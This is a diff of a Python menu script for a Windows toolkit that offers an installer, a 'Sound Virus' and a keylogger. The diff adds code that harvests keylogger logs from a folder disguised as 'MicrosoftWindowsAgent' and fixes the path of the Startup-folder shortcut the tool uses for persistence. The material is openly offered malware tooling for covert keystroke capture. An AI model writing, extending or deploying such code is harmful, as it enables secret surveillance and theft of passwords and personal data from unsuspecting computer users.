@@ -1,24 +1,16 @@
 from Colors import color
-from getpass import getuser as user
 from os import system as cmd
-from os import getcwd, getenv,path,environ
+from os import getenv,path, listdir
 from time import sleep
 import win32com.client
-
-# Define user / hostname / local path
-user = user()
-hostname = getenv("COMPUTERNAME")
-local_path = getcwd()
-# If is in User_Path
-if user in local_path:
-    local_path = "~" + local_path[local_path.find(user[-1:])+1:].replace("\\","/")
+from Colors import text
 
 # Text Samples
-which_app = f"{color.fg.yellow}Installer{color.reset}{color.fg.cyan}[{color.fg.blue}0{color.fg.cyan}]{color.reset} {color.type.Black},{color.reset} {color.fg.purple}Sound Virus{color.reset}{color.fg.cyan}[{color.fg.blue}1{color.fg.cyan}]{color.reset}{color.type.Black} or {color.reset}{color.fg.red}KeyLogger{color.reset}{color.fg.cyan}[{color.fg.blue}2{color.fg.cyan}]"
-shell_simbol = f"{color.type.Black}{color.fg.blue}\n$ {color.reset}"
-wrong_value = f"{color.fg.red}{color.type.Black}%ERROR%{color.reset} WRONG VALUE"
-version = f"{color.type.Black}0.0.1 {color.reset}{color.fg.cyan}Beta{color.reset}"
-user_text = f"{color.fg.green}({color.fg.blue}{user}@{hostname}{color.reset}{color.fg.green})-[{color.reset}{color.type.Black}{local_path}{color.fg.green}]{color.reset}"
+which_app = text.which_app
+shell_simbol = text.shell_simbol
+wrong_value = text.wrong_value
+version = text.version
+user_text = text.user_text
 
 # Create Shortcut
 
@@ -28,7 +20,7 @@ def create_file_shortcut(file_path, shortcut_name=None):
     shell = win32com.client.Dispatch("WScript.Shell")
     # Get the path to the desktop
 
-    desktop = file_local_save+"\Microsoft\Windows\Start Menu\Programs\Startup"
+    desktop = file_local_save+r"\Microsoft\Windows\Start Menu\Programs\Startup"
 
     # Set the name of the shortcut and the full path where it will be created
     if not shortcut_name:
@@ -55,6 +47,31 @@ elif option == '1':
     cmd("cls")
     cmd("Sounds.exe")
 elif option == '2':
+    cmd("cls")
+    print(rf"{color.fg.cyan}Copy log file? {color.reset}{color.type.Black}[Y\n]{color.reset}")
+    opt = str(input(f"\n {shell_simbol}"))
+    if opt.capitalize().strip() == "Y":
+        if path.isfile(rf"%appdata%\MicrosoftWindowsAgent\\log.txt"):
+            cmd(rf"copy %appdata%\MicrosoftWindowsAgent\\log.txt %appdata%\MicrosoftWindowsAgent\\log000.txt")
+        if not path.exists(r".\logs"):
+            cmd(r"mkdir .\logs")
+        path_dir = "logs\\"
+        arquivos = [f for f in listdir(path_dir) if path.isfile(path.join(path_dir,f))]
+
+        for arquivo in arquivos:
+            lista = arquivo.split()
+            for nome in lista:
+                if nome.startswith("log"):
+                    number = int(nome[3:6]) + 1
+                    if number >= 1000:
+                        print("excede o maximo de arquivos")
+                    else:
+                        file_name = f"{number:03}"  # Formata o número com 3 dígitos, preenchendo com zeros à esquerda
+                        file_name = "log"+str(file_name)+".txt"
+                        cmd(rf"copy %appdata%\MicrosoftWindowsAgent\\log000.txt .\logs\{file_name} ")
+
+        cmd(rf"copy %appdata%\MicrosoftWindowsAgent\\log000.txt .\logs ")
+
     if not path.exists(f"{file_local_save}\MicrosoftWindowsAgent\\log.txt"):
         cmd(rf'mkdir %appdata%\MicrosoftWindowsAgent')
         cmd(rf'type nul > %appdata%\MicrosoftWindowsAgent\\log.txt')
